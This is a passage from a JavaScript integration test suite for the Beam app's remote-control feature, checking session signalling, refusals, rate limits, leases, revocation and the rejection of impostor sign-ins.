    assert.equal((await dev('rcnoprof001')).can.remoteControl, false, 'not tied to its app');
    assert.ok((await s.req('GET', '/api/info', { headers: t.laptop })).json.features.includes('remote-control'));
    assert.match(s.out, /Desktop allows remote control now/);
    assert.match(s.out, /Desktop no longer allows remote control/);
    assert.match(s.out, /Bare PC turned on "Allow remote control" without X-Beam-Profile: it can't be controlled/);
  } finally { await t.stop(); }
});

test('1.6 Remote control: a whole session between two devices; its events reach only them; rc-sessions reaches everyone', async () => {
  const t = await rcSetup('rc-life');
  try {
    const { s, pc, laptop, phone, status, rc, start } = t;
    await status(pc, { remoteControl: true, locked: false });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    const phoneEv = await openEvents(s.port, phone, '/api/events?mode=background');
    const watch = await openEvents(s.port, t.other); // foreground: sees rc-sessions at once
    for (const e of [pcEv, lapEv, phoneEv, watch]) await e.wait('hello');
    await sleep(400);
    const phoneBefore = phoneEv.events.length;
    let r = await start(laptop);
    assert.equal(r.status, 201, r.body);
    assert.equal(r.headers['cache-control'], 'no-store');
    const id = r.json.id;
    assert.match(id, /^[a-f0-9]{16}$/);
    assert.deepEqual(r.json.host, { id: 'rcdesk00001', name: 'Desktop', ip4: RC_NET.pc.ip4, ip6: RC_NET.pc.ip6 });
    assert.deepEqual(r.json.you, { ip4: RC_NET.laptop.ip4, ip6: RC_NET.laptop.ip6 });
    const asked = (await pcEv.wait('rc-request', d => d.id === id, 1000)).data;
    assert.ok(asked.at > 0);
    assert.deepEqual({ ...asked, at: 0 }, {
      id, from: 'rclaptop001', by: 'Robin Laptop', at: 0,
      viewer: { ip: RC_NET.laptop.ip4, ip4: RC_NET.laptop.ip4, ip6: RC_NET.laptop.ip6, node: 'robin-laptop', user: RC_USER, platform: 'windows' },
    });
    let list = await rc('GET', 'sessions', phone);
    assert.equal(list.headers['cache-control'], 'no-store');
    assert.deepEqual(list.json.sessions.map(x => [x.id, x.host, x.viewer, x.state]), [[id, 'rcdesk00001', 'rclaptop001', 'requested']]);
    await watch.wait('rc-sessions', d => d.sessions.some(x => x.id === id), 1500);
    // The PC accepts (its first lease), offers; the viewer answers; candidates go both ways, each only to the other.
    r = await rc('POST', `sessions/${id}/lease`, pc);
    assert.deepEqual([r.status, r.json, r.headers['cache-control']], [200, { ok: true }, 'no-store']);
    assert.equal((await rc('GET', 'sessions', phone)).json.sessions[0].state, 'live');
    assert.equal((await rc('POST', `sessions/${id}/signal`, pc, { kind: 'offer', sdp: 'v=0 the offer' })).status, 204);
    assert.deepEqual((await lapEv.wait('rc-signal', d => d.kind === 'offer', 1000)).data, { id, from: 'rcdesk00001', kind: 'offer', sdp: 'v=0 the offer' });
    assert.equal((await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'answer', sdp: 'v=0 the answer' })).status, 204);
    assert.deepEqual((await pcEv.wait('rc-signal', d => d.kind === 'answer', 1000)).data, { id, from: 'rclaptop001', kind: 'answer', sdp: 'v=0 the answer' });
    const cand = { candidate: 'candidate:1 1 udp 2122260223 4f1c.local 54321 typ host', sdpMid: '0', sdpMLineIndex: 0, usernameFragment: 'abcd', extra: 'dropped' };
    assert.equal((await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'candidates', candidates: [cand] })).status, 204);
    assert.deepEqual((await pcEv.wait('rc-signal', d => d.kind === 'candidates', 1000)).data.candidates,
      [{ candidate: cand.candidate, sdpMid: '0', sdpMLineIndex: 0, usernameFragment: 'abcd' }]);
    assert.equal((await rc('POST', `sessions/${id}/signal`, pc, { kind: 'candidates', candidates: [{ candidate: '' }] })).status, 204, 'end of candidates');
    assert.deepEqual((await lapEv.wait('rc-signal', d => d.kind === 'candidates', 1000)).data.candidates, [{ candidate: '', sdpMid: null, sdpMLineIndex: null }]);
    assert.equal((await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'restart' })).status, 204);
    assert.deepEqual((await pcEv.wait('rc-signal', d => d.kind === 'restart', 1000)).data, { id, from: 'rclaptop001', kind: 'restart' });
    // Nobody else heard any of it: the phone's background stream wasn't even written to.
    await sleep(300);
    assert.equal(phoneEv.events.length, phoneBefore, 'the phone (no party) got nothing');
    assert.ok(!lapEv.events.some(e => e.event === 'rc-request'), 'the request went to the PC only');
    assert.ok(!watch.events.some(e => /^rc-(request|signal|end)$/.test(e.event)), 'nor to anyone else');
    // The viewer stops: both hear rc-end at once; the PC's next lease gets 410.
    assert.equal((await rc('POST', `sessions/${id}/end`, laptop, { reason: 'stopped' })).status, 204);
    for (const e of [pcEv, lapEv]) {
      assert.deepEqual((await e.wait('rc-end', d => d.id === id, 1000)).data, { id, reason: 'stopped', from: 'rclaptop001', by: 'Robin Laptop' });
    }
    r = await rc('POST', `sessions/${id}/lease`, pc);
    assert.deepEqual([r.status, r.json.reason], [410, 'stopped']);
    assert.equal((await rc('POST', `sessions/${id}/signal`, pc, { kind: 'restart' })).status, 410);
    assert.equal((await rc('POST', `sessions/${id}/end`, pc)).status, 204, 'ending it twice is fine');
    assert.deepEqual((await rc('GET', 'sessions', phone)).json.sessions, []);
    await watch.wait('rc-sessions', d => d.sessions.length === 0, 1500);
    assert.ok(!phoneEv.events.some(e => e.event.startsWith('rc-')), 'held on a background stream (not urgent for the phone)');
    assert.match(s.out, /Desktop's remote control is tied to its Beam app on desk \(100\.64\.91\.1\)/);
    assert.match(s.out, /Robin Laptop asked to control Desktop \(from robin-laptop, 100\.64\.91\.2, robin@example\.com\)/);
    assert.match(s.out, /Robin Laptop is controlling Desktop/);
    assert.match(s.out, /Robin Laptop stopped controlling Desktop after \d+ s \(stopped, by Robin Laptop\)/);
    const metrics = (await s.req('GET', '/api/metrics', { headers: laptop })).json.rc;
    assert.deepEqual([metrics.sessions, metrics.started, metrics.ended.stopped], [0, 1, 1]);
    for (const e of [pcEv, lapEv, phoneEv, watch]) e.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control refusals: every reason, session-only sign-ins, the rate limit, bad signals, and the kill switch', async () => {
  const t = await rcSetup('rc-refuse');
  try {
    const { s, K, pc, laptop, phone, other, status, rc, start } = t;
    const why = async (h, device) => { const r = await start(h, device); return [r.status, r.json?.reason]; };
    assert.deepEqual(await why(laptop, 'nosuchdevice1'), [404, undefined]);
    assert.equal((await rc('POST', 'sessions', laptop, { pc: 'rcdesk00001' })).status, 400);
    assert.deepEqual(await why(laptop), [409, 'not-allowed'], 'the switch is off');
    await status(pc, { remoteControl: true, locked: false });
    assert.deepEqual(await why(pc), [409, 'self']);
    assert.deepEqual(await why(laptop, 'rcphone0001'), [409, 'not-allowed'], 'only Windows PCs');
    await status(pc, { locked: true });
    let r = await start(laptop);
    assert.deepEqual([r.status, r.json.reason, r.headers['cache-control']], [409, 'locked', 'no-store']);
    await status(pc, { locked: false });
    assert.deepEqual(await why(laptop), [409, 'offline'], 'the PC has no event stream');
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    r = await start(laptop);
    assert.equal(r.status, 201);
    assert.deepEqual(await why(phone), [409, 'busy'], 'one session per PC');
    const again = await start(laptop);
    assert.equal(again.status, 201, 'the same viewer again (it reloaded) takes over');
    assert.deepEqual((await pcEv.wait('rc-end', d => d.id === r.json.id, 1000)).data.reason, 'stopped');
    await pcEv.wait('rc-request', d => d.id === again.json.id, 1000);
    await rc('POST', `sessions/${again.json.id}/end`, laptop);
    // A device that reaches Beam without Tailscale: no address to check the peer against.
    const lan = app(K, 'rclan000001', 'LAN laptop', 'windows', { ...from('192.168.1.50'), 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': 'f7f7f7f7f7f7f7f7' });
    await s.req('GET', '/api/me', { headers: lan });
    assert.deepEqual(await why(lan), [409, 'no-tailscale']);
    // A session-only (borrowed computer) sign-in: never.
    await post(s, '/api/password', { password: 'rc session pass' }, laptop);
    const login = await post(s, '/api/login', { secret: 'rc session pass', remember: false }, { ...sameOrigin, Cookie: 'beam_device_id=rcborrow001' });
    assert.equal(login.status, 204);
    const borrowed = cookie(cookieValue(login), 'rcborrow001', { ...sameOrigin, 'X-Beam-Platform': 'web', 'X-Beam-Device': 'Library PC', ...from('100.64.91.77') });
    r = await s.req('POST', '/api/rc/sessions', { headers: json(borrowed), body: '{"device":"rcdesk00001"}' });
    assert.deepEqual([r.status, r.json.reason], [403, 'temporary']);
    for (const [method, route] of [['GET', 'sessions'], ['POST', 'disable'], ['POST', 'sessions/0123456789abcdef/end']]) {
      r = await s.req(method, `/api/rc/${route}`, { headers: json(borrowed), ...(method === 'POST' && { body: '{"device":"rcdesk00001"}' }) });
      assert.deepEqual([r.status, r.json.reason], [403, 'temporary'], route);
    }
    // About 10 requests a minute per device, then 429 with Retry-After.
    const statuses = [];
    for (let i = 0; i < 11; i++) statuses.push((await start(other, 'nosuchdevice1')).status);
    assert.deepEqual(statuses, [...Array(10).fill(404), 429]);
    r = await start(other);
    assert.ok(r.status === 429 && Number(r.headers['retry-after']) >= 1, 'with Retry-After');
    // Signals: only its parties, the right roles, sizes and counts.
    const sid = (await start(laptop)).json.id;
    const sig = (h, body) => rc('POST', `sessions/${sid}/signal`, h, body);
    assert.equal((await sig(phone, { kind: 'restart' })).status, 404, 'not one of its parties');
    assert.equal((await sig(laptop, { kind: 'shout' })).status, 400);
    assert.equal((await sig(laptop, { kind: 'offer', sdp: 'v=0' })).status, 400, 'only the PC offers');
    assert.equal((await sig(pc, { kind: 'answer', sdp: 'v=0' })).status, 400, 'only the viewer answers');
    assert.equal((await sig(pc, { kind: 'offer' })).status, 400, 'an offer needs its SDP');
    assert.equal((await sig(pc, { kind: 'offer', sdp: 'x'.repeat(64 * 1024 + 1) })).status, 413);
    assert.equal((await sig(pc, { kind: 'candidates', candidates: Array.from({ length: 21 }, () => ({ candidate: '' })) })).status, 400, 'at most 20 a signal');
    assert.equal((await sig(pc, { kind: 'candidates', candidates: [{ candidate: 'c'.repeat(257) }] })).status, 400, 'at most 256 characters');
    assert.equal((await sig(pc, { kind: 'candidates', candidates: [{ candidate: 5 }] })).status, 400);
    assert.equal((await rc('POST', `sessions/${sid}/lease`, laptop)).status, 404, 'only the PC leases');
    assert.equal((await rc('POST', 'sessions/0123456789abcdef/lease', pc)).status, 404);
    assert.equal((await rc('POST', `sessions/${sid}/end`, laptop, { reason: 'bored' })).status, 400);
    assert.equal((await rc('POST', `sessions/${sid}/lease`, pc)).status, 200);
    let n = 0;
    while ((r = await sig(laptop, { kind: 'restart' })).status === 204) n++;
    assert.deepEqual([n, r.status, r.json.reason], [300, 429, 'signals'], 'at most 300 signals a session');
    // Any signed-in device can end any session (Settings: "End").
    assert.equal((await rc('POST', `sessions/${sid}/end`, phone)).status, 204);
    assert.deepEqual((await pcEv.wait('rc-end', d => d.id === sid, 1000)).data, { id: sid, reason: 'stopped', from: 'rcphone0001', by: 'Pixel' });
    assert.equal((await rc('POST', 'sessions/0123456789abcdef/end', phone)).status, 404);
    assert.match(s.out, /Refused remote control of Desktop for Robin Laptop: Remote control is off on Desktop/);
    pcEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control: a session whose lease is late ends (rc-end "lease"); a restart forgets sessions (lease 404)', async () => {
  const t = await rcSetup('rc-lease', { env: { BEAM_TEST_RC_LEASE_MS: '1000' } });
  try {
    const { pc, laptop, status, rc, start } = t;
    await status(pc, { remoteControl: true });
    let pcEv = await openEvents(t.s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(t.s.port, laptop, '/api/events?mode=background');
    for (const e of [pcEv, lapEv]) await e.wait('hello');
    const id = (await start(laptop)).json.id;
    for (let i = 0; i < 3; i++) {
      await sleep(600);
      assert.equal((await rc('POST', `sessions/${id}/lease`, pc)).status, 200, 'leases keep it going');
    }
    const last = Date.now();
    for (const e of [pcEv, lapEv]) assert.deepEqual((await e.wait('rc-end', d => d.id === id, 3000)).data, { id, reason: 'lease', from: null, by: null });
    assert.ok(Date.now() - last >= 800, `not before the lease is late (${Date.now() - last} ms)`);
    assert.equal((await rc('POST', `sessions/${id}/lease`, pc)).status, 410);
    // A restart forgets every session: the PC's next lease gets 404, and it ends it.
    const id2 = (await start(laptop)).json.id;
    pcEv.close();
    lapEv.close();
    await t.s.stop();
    t.s = await startServer('rc-lease', 8791, { keep: true, env: t.env });
    assert.equal((await rc('POST', `sessions/${id2}/lease`, pc)).status, 404);
    pcEv = await openEvents(t.s.port, pc);
    await pcEv.wait('hello');
    assert.deepEqual((await rc('GET', 'sessions', laptop)).json.sessions, []);
    assert.equal((await t.start(laptop)).status, 201, 'remote control stays tied to the PC across the restart');
    pcEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control ends when a party is removed, merged away, switches it off, or it is turned off from elsewhere', async () => {
  const t = await rcSetup('rc-hooks');
  try {
    const { s, K, pc, laptop, phone, status, rc, start } = t;
    await status(pc, { remoteControl: true });
    let pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const phoneEv = await openEvents(s.port, phone, '/api/events?mode=background');
    for (const e of [pcEv, phoneEv]) await e.wait('hello');
    const live = async h => {
      const r = await start(h);
      assert.equal(r.status, 201, r.body);
      assert.equal((await rc('POST', `sessions/${r.json.id}/lease`, pc)).status, 200);
      return r.json.id;
    };
    // The viewer is removed (from another device): the PC hears "revoked" at once.
    let id = await live(laptop);
    assert.equal((await s.req('DELETE', '/api/devices/rclaptop001', { headers: phone })).status, 204);
    assert.deepEqual((await pcEv.wait('rc-end', d => d.id === id, 1000)).data, { id, reason: 'revoked', from: null, by: null });
    // The PC reports its switch off: its sessions end.
    id = await live(phone);
    await status(pc, { remoteControl: false });
    assert.deepEqual((await phoneEv.wait('rc-end', d => d.id === id, 1000)).data, { id, reason: 'revoked', from: 'rcdesk00001', by: 'Desktop' });
    // Turned off from another device: rc-disable to the PC, its session ends, and it can't be controlled until the
    // PC reports the switch off; until then it hears rc-disable again when it connects or says the switch is on.
    await status(pc, { remoteControl: true });
    id = await live(phone);
    let r = await rc('POST', 'disable', phone, { device: 'rcdesk00001' });
    assert.equal(r.status, 202);
    assert.deepEqual((await pcEv.wait('rc-disable', () => true, 1000)).data, { from: 'rcphone0001', by: 'Pixel' });
    assert.deepEqual((await phoneEv.wait('rc-end', d => d.id === id, 1000)).data, { id, reason: 'revoked', from: 'rcphone0001', by: 'Pixel' });
    const can = async () => (await s.req('GET', '/api/devices', { headers: phone })).json.devices.find(d => d.id === 'rcdesk00001').can.remoteControl;
    assert.equal(await can(), false);
    assert.deepEqual((await start(phone)).json.reason, 'not-allowed');
    pcEv.close();
    await sleep(200);
    pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('rc-disable', () => true, 1000);
    await status(pc, { remoteControl: true }); // a PC that hasn't caught up
    await waitFor(() => pcEv.events.filter(e => e.event === 'rc-disable').length === 2, 1000);
    await status(pc, { remoteControl: false }); // done
    await status(pc, { remoteControl: true }); // turned on again at the PC itself: allowed
    assert.equal(await can(), true);
    await sleep(200);
    assert.equal(pcEv.events.filter(e => e.event === 'rc-disable').length, 2);
    assert.match(s.out, /Pixel turned off remote control on Desktop/);
    // Merged away: the PC's app reinstalled (a new id on the same machine) ends the old id's sessions.
    id = await live(phone);
    pcEv.close();
    await sleep(300);
    const pc2 = app(K, 'rcdesk00002', 'Desktop', 'windows', { ...from(RC_NET.pc.ip4), 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': RC_PROFILE.pc });
    await s.req('GET', '/api/me', { headers: pc2 });
    assert.deepEqual((await phoneEv.wait('rc-end', d => d.id === id, 1000)).data.reason, 'revoked');
    assert.match(s.out, /Linked "Desktop" to "Desktop" \(reinstalled app\)/);
    phoneEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control: a reinstalled PC (merged into a new id) keeps a pending disable and reports its own switch and lock', async () => {
  const t = await rcSetup('rc-merge');
  try {
    const { s, K, pc, phone, status, rc, start } = t;
    await status(pc, { remoteControl: true, locked: false });
    let pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    assert.equal((await rc('POST', 'disable', phone, { device: 'rcdesk00001' })).status, 202);
    pcEv.close();
    await sleep(300);
    const pc2 = app(K, 'rcdesk00002', 'Desktop', 'windows', { ...from(RC_NET.pc.ip4), 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': RC_PROFILE.pc });
    await s.req('GET', '/api/me', { headers: pc2 });
    const dev = async () => (await s.req('GET', '/api/devices', { headers: phone })).json.devices.find(d => d.id === 'rcdesk00002');
    let d = await dev();
    assert.deepEqual([d.can.remoteControl, d.status.remoteControl, d.status.locked], [false, undefined, undefined], 'the switch and lock are not inherited');
    pcEv = await openEvents(s.port, pc2, '/api/events?mode=background');
    assert.deepEqual((await pcEv.wait('rc-disable', () => true, 1000)).data, { from: 'rcphone0001', by: 'Pixel' }, 'the pending disable moved with it');
    await status(pc2, { remoteControl: true }); // the reinstalled app still has its switch on
    await waitFor(() => pcEv.events.filter(e => e.event === 'rc-disable').length === 2, 1000);
    assert.deepEqual((await start(phone, 'rcdesk00002')).json.reason, 'not-allowed');
    await status(pc2, { remoteControl: false });
    await status(pc2, { remoteControl: true });
    d = await dev();
    assert.equal(d.can.remoteControl, true);
    pcEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control: a sign-in naming the PC\'s device id from another machine or Windows account can\'t act as the PC', async () => {
  const t = await rcSetup('rc-impostor');
  try {
    const { s, pc, laptop, phone, status, rc, start } = t;
    await status(pc, { remoteControl: true, locked: false });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    // A pairing link redeemed by another machine, naming the PC's id (an owner made the link).
    const pair = (await s.req('GET', '/api/pair', { headers: phone })).json;
    const imp = {
      Authorization: `Bearer ${pair.key}`, 'X-Beam-Device-Id': 'rcdesk00001', 'X-Beam-Device': 'Desktop', 'X-Beam-Platform': 'windows',
      'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': RC_PROFILE.pc, ...from('100.64.91.66'),
    };
    assert.equal((await s.req('GET', '/api/me', { headers: imp })).status, 200);
    const impEv = await openEvents(s.port, imp, '/api/events?mode=background');
    await impEv.wait('hello');
    // It can't report the switch or the lock as the PC (so it can't clear a pending disable either).
    let r = await status(imp, { remoteControl: false });
    assert.deepEqual([r.status, r.json.reason], [403, 'machine']);
    assert.equal((await status(imp, { locked: true })).status, 403);
    // Sessions still go to the real PC: its attested address, its stream only.
    r = await start(laptop);
    assert.equal(r.status, 201, r.body);
    assert.deepEqual([r.json.host.ip4, r.json.host.ip6], [RC_NET.pc.ip4, RC_NET.pc.ip6]);
    const id = r.json.id;
    await pcEv.wait('rc-request', d => d.id === id, 1000);
    // ...and only the real PC may lease, offer or say "not on my list".
    assert.deepEqual([(await rc('POST', `sessions/${id}/lease`, imp)).status, (await rc('POST', `sessions/${id}/signal`, imp, { kind: 'offer', sdp: 'v=0 fake' })).status], [403, 403]);
    assert.equal((await rc('POST', `sessions/${id}/lease`, pc)).status, 200);
    // Another Windows account on the PC's own machine isn't the PC either.
    const otherAccount = { ...pc, 'X-Beam-Profile': 'e5e5e5e5e5e5e5e5' };
    assert.equal((await status(otherAccount, { remoteControl: false })).status, 403);
    assert.equal((await rc('POST', `sessions/${id}/lease`, otherAccount)).status, 403);
    // A Windows sign-in without its device's key can't even end it; any other device can (Settings: End).
    const end = await rc('POST', `sessions/${id}/end`, imp, { reason: 'not-listed' });
    assert.deepEqual([end.status, end.json.reason], [403, 'device-key']);
    assert.equal((await rc('POST', `sessions/${id}/end`, phone, { reason: 'not-listed' })).status, 204);
    assert.deepEqual((await pcEv.wait('rc-end', d => d.id === id, 1000)).data, { id, reason: 'stopped', from: 'rcphone0001', by: 'Pixel' });
    await sleep(200);
    assert.ok(!impEv.events.some(e => e.event.startsWith('rc-')), 'the impostor heard nothing about remote control');
    assert.match(s.out, /Refused a remote control request as Desktop from another machine or Windows account \(100\.64\.91\.66\)/);
    // The PC's own app at a new address of the same Tailscale node (the same StableID) is still the PC.
    const moved = { ...pc, ...from('100.64.91.11') };
    assert.equal((await status(moved, { remoteControl: true })).status, 204);
    assert.match(s.out, /Desktop's remote control follows its Tailscale machine to 100\.64\.91\.11/);
    assert.equal((await start(laptop)).json.host.ip4, '100.64.91.11');
    pcEv.close();
    impEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control is for an app\'s own sign-in or a browser signed in with a link, an approval, the password or the key', async () => {
  const t = await rcSetup('rc-eligible', { env: { BEAM_TAILSCALE_OWNERS: RC_USER } });
  try {
    const { s, K, pc, laptop, phone, status, rc } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background'); // the laptop's app is online
    for (const e of [pcEv, lapEv]) await e.wait('hello');
    const startWith = h => s.req('POST', '/api/rc/sessions', { headers: { 'Content-Type': 'application/json', ...h }, body: '{"device":"rcdesk00001"}' });
    const allowed = async (h, label) => {
      const r = await startWith(h);
      assert.equal(r.status, 201, `${label}: ${r.body}`);
      return r.json.id;
    };
    const refused = async (h, label, reason = 'sign-in') => {
      const r = await startWith(h);
      assert.deepEqual([r.status, r.json?.reason], [403, reason], label);
    };
    // Someone else on the laptop (another Windows account) opens Beam in a browser: Tailscale vouches for the
    // machine, which is the user's account, so the browser signs in by Tailscale identity; same-machine linking
    // then merges it into the laptop app's id. The sign-in decides, not the id: refused.
    const tsWeb = await post(s, '/api/autopair', { client: 'web' }, { ...sameOrigin, Cookie: 'beam_device_id=rctsweb0001', ...viaServe(RC_NET.laptop.ip4, RC_USER) });
    assert.deepEqual([tsWeb.status, tsWeb.json.via], [200, 'tailscale'], tsWeb.body);
    const tsBrowser = { Cookie: `beam_key=${cookieValue(tsWeb)}; beam_device_id=rctsweb0001`, ...sameOrigin, ...viaServe(RC_NET.laptop.ip4, RC_USER) };
    assert.equal((await s.req('GET', '/api/me', { headers: tsBrowser })).headers['x-beam-you'], 'rclaptop001', 'linked to the laptop app');
    await refused(tsBrowser, 'a browser signed in by Tailscale identity, merged into an app');
    // Signed in because a Beam app runs on the same machine, even naming the app's id; and a link made from that.
    const ap = await post(s, '/api/autopair', { client: 'web', deviceId: 'rclaptop001' }, { ...sameOrigin, ...from(RC_NET.laptop.ip4) });
    assert.deepEqual([ap.status, ap.json.via], [200, 'machine']);
    await refused({ Cookie: `beam_key=${cookieValue(ap)}; beam_device_id=rclaptop001`, ...sameOrigin, 'X-Beam-Platform': 'windows', ...from(RC_NET.laptop.ip4) }, 'same-machine autopair');
    const linked = await post(s, '/api/login', { secret: cookieValue(ap) }, { ...sameOrigin, Cookie: 'beam_device_id=rclinked001' });
    assert.equal(linked.status, 204);
    await refused({ Cookie: `beam_key=${cookieValue(linked)}; beam_device_id=rclinked001`, ...sameOrigin, ...from('100.64.91.79') }, 'a link made from it');
    // The CLI, even with a pairing link.
    const cliKey = (await s.req('GET', '/api/pair', { headers: phone })).json.key;
    await refused({ Authorization: `Bearer ${cliKey}`, 'X-Beam-Device-Id': 'rccli000001', 'X-Beam-Device': 'beam-cli', 'X-Beam-Platform': 'cli', ...from('100.64.91.83') }, 'the CLI');
    // A Beam app's own requests must say which Windows account they come from.
    await refused(app(K, 'rcbare00001', 'Bare', 'windows', { ...from('100.64.91.80'), 'X-Beam-App-Version': '1.6.0' }), 'an app without X-Beam-Profile', 'profile');
    // Allowed: a Windows app's own sign-in (here by Tailscale identity, for a new device) once it shows its device key...
    const KEY = deviceKey();
    const appSignIn = await post(s, '/api/autopair', { client: 'app', name: 'Work Laptop', platform: 'windows' }, viaServe(RC_NET.laptop.ip4, RC_USER));
    assert.deepEqual([appSignIn.status, appSignIn.json.via], [200, 'tailscale'], appSignIn.body);
    const winId = appSignIn.json.you;
    const winApp = { Authorization: `Bearer ${appSignIn.json.key}`, 'X-Beam-Device-Id': winId, 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'acacacacacacacac', 'X-Beam-App-Version': '1.6.0', ...from(RC_NET.laptop.ip4) };
    await refused(winApp, 'a Windows sign-in without its device key', 'device-key');
    let id = await allowed({ ...winApp, 'X-Beam-Device-Key': KEY }, "the Windows app's own sign-in, with its device key");
    await rc('POST', `sessions/${id}/end`, pc);
    // ...the Android app's own sign-in (a pairing link), exchanged for its remote-control activity's cookie (/?key=)...
    const phoneKey = (await s.req('GET', '/api/pair', { headers: laptop })).json.key;
    const phoneApp = { Authorization: `Bearer ${phoneKey}`, 'X-Beam-Device-Id': 'rcphone0001', 'X-Beam-Platform': 'android', 'X-Beam-Profile': RC_PROFILE.phone, 'X-Beam-App-Version': '1.6.0', ...from(RC_NET.phone.ip6) };
    assert.equal((await s.req('GET', '/api/me', { headers: phoneApp })).status, 200);
    const exchange = await s.req('GET', `/?key=${encodeURIComponent(phoneKey)}`, { headers: { Cookie: 'beam_device_id=rcphone0001', ...from(RC_NET.phone.ip6) } });
    assert.equal(exchange.status, 302);
    const activity = { Cookie: `beam_key=${cookieValue(exchange)}; beam_device_id=rcphone0001`, 'X-Beam-Platform': 'android', ...sameOrigin, ...from(RC_NET.phone.ip6) };
    id = await allowed(activity, "the Android activity's exchange token");
    await rc('POST', `sessions/${id}/end`, pc);
    // ...a browser signed in with the password...
    await post(s, '/api/password', { password: 'rc eligible pass' }, laptop);
    const login = await post(s, '/api/login', { secret: 'rc eligible pass' }, { ...sameOrigin, Cookie: 'beam_device_id=rcbrowse002' });
    id = await allowed({ Cookie: `beam_key=${cookieValue(login)}; beam_device_id=rcbrowse002`, ...sameOrigin, ...from('100.64.91.82') }, 'a browser signed in with the password');
    await rc('POST', `sessions/${id}/end`, pc);
    // ...and the Windows app's viewer window, which uses the app's own sign-in as its cookie (X-Beam-Platform
    // windows, no X-Beam-Profile). The viewer's events reach that sign-in's streams only.
    // Its pages carry no key themselves; the app adds X-Beam-Device-Key to their /api/ requests (a copied sign-in
    // alone, as a cookie, gets nowhere).
    const copied = { Cookie: `beam_key=${appSignIn.json.key}`, 'X-Beam-Device-Id': winId, 'X-Beam-Platform': 'windows', ...sameOrigin, ...from(RC_NET.laptop.ip4) };
    await refused(copied, "the app's key-bound sign-in as a cookie, without the key", 'device-key');
    for (const route of ['sessions', 'disable']) {
      const r = await s.req(route === 'sessions' ? 'GET' : 'POST', `/api/rc/${route}`, { headers: { 'Content-Type': 'application/json', ...copied }, ...(route === 'disable' && { body: '{"device":"rcdesk00001"}' }) });
      assert.deepEqual([r.status, r.json.reason], [403, 'device-key'], route);
    }
    const viewerWindow = { ...copied, 'X-Beam-Device-Key': KEY };
    const winEv = await openEvents(s.port, viewerWindow);
    // The master key acting as that device must show the key too; with it, it is another sign-in of the same device.
    const asWin = app(K, winId, 'Work Laptop', 'windows', { 'X-Beam-Profile': 'acacacacacacacac', ...from(RC_NET.laptop.ip4) });
    assert.deepEqual([(await s.req('GET', '/api/me', { headers: asWin })).status], [403]);
    const otherSignIn = { ...asWin, 'X-Beam-Device-Key': KEY };
    const otherEv = await openEvents(s.port, otherSignIn);
    for (const e of [winEv, otherEv]) await e.wait('hello');
    id = await allowed(viewerWindow, "the Windows app's viewer window");
    await pcEv.wait('rc-request', d => d.id === id, 1000);
    await rc('POST', `sessions/${id}/lease`, pc);
    await rc('POST', `sessions/${id}/signal`, pc, { kind: 'offer', sdp: 'v=0 for the window' });
    await winEv.wait('rc-signal', d => d.id === id && d.kind === 'offer', 1000);
    // The device's other sign-in is the same device, but not the session's viewer.
    await sleep(200);
    assert.ok(!otherEv.events.some(e => e.event === 'rc-signal'), "another sign-in of the same device doesn't get the viewer's events");
    assert.equal((await rc('POST', `sessions/${id}/signal`, otherSignIn, { kind: 'answer', sdp: 'v=0 hijack' })).status, 404, '...nor may it answer');
    const r = await s.req('POST', `/api/rc/sessions/${id}/signal`, { headers: { 'Content-Type': 'application/json', ...viewerWindow }, body: '{"kind":"answer","sdp":"v=0 answer"}' });
    assert.equal(r.status, 204);
    await pcEv.wait('rc-signal', d => d.id === id && d.kind === 'answer', 1000);
    for (const e of [pcEv, lapEv, winEv, otherEv]) e.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control and sign-ins from before 1.6: an app\'s counts once the app uses it; a browser\'s by Tailscale never', async () => {
  const t = await rcSetup('rc-legacy', { env: { BEAM_TAILSCALE_OWNERS: RC_USER } });
  try {
    const appSignIn = await post(t.s, '/api/autopair', { client: 'app', deviceId: 'rclaptop001', name: 'Robin Laptop', platform: 'windows' }, viaServe(RC_NET.laptop.ip4, RC_USER));
    const webSignIn = await post(t.s, '/api/autopair', { client: 'web' }, { ...sameOrigin, Cookie: 'beam_device_id=rcoldweb001', ...viaServe(RC_NET.other.ip4, RC_USER) });
    assert.deepEqual([appSignIn.status, webSignIn.status], [200, 200]);
    await t.status(t.pc, { remoteControl: true });
    await sleep(500); // tokens.json and devices.json are written (the server is stopped hard)
    await t.s.stop();
    // What 1.5 wrote: no platform with the tokens.
    const file = path.join(t.s.data, 'tokens.json');
    const store = JSON.parse(fs.readFileSync(file, 'utf8'));
    for (const tok of Object.values(store.tokens)) {
      delete tok.platform;
      delete tok.keyHash;
      delete tok.claimed;
    }
    fs.writeFileSync(file, JSON.stringify(store));
    t.s = await startServer('rc-legacy', 8791, { keep: true, env: t.env });
    const pcEv = await openEvents(t.s.port, t.pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    const startWith = h => t.s.req('POST', '/api/rc/sessions', { headers: { 'Content-Type': 'application/json', ...h }, body: '{"device":"rcdesk00001"}' });
    let r = await startWith({ Cookie: `beam_key=${cookieValue(webSignIn)}; beam_device_id=rcoldweb001`, ...sameOrigin, ...viaServe(RC_NET.other.ip4, RC_USER) });
